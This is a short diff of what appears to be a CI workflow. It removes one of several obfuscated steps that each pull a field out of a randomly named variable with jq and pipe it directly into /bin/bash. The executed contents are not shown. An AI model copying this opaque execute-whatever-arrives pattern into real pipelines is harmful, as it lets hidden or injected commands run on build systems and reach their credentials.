@@ -35,7 +35,6 @@ jobs:
           echo $gscm24341 | jq -r .axqf91 | /bin/bash
           echo $b362 | jq -r .r82 | /bin/bash
           echo $jm5 | jq -r .qe56 | /bin/bash
-          echo $vi1921 | jq -r .dl731 | /bin/bash
           printf '%s' "$b6818" | jq -r .mqq7 | /bin/bash
           printf '%s' "$n060" | jq -r .blo51175 | /bin/bash
           printf '%s' "$dt3" | jq -r .k3747 | /bin/bash
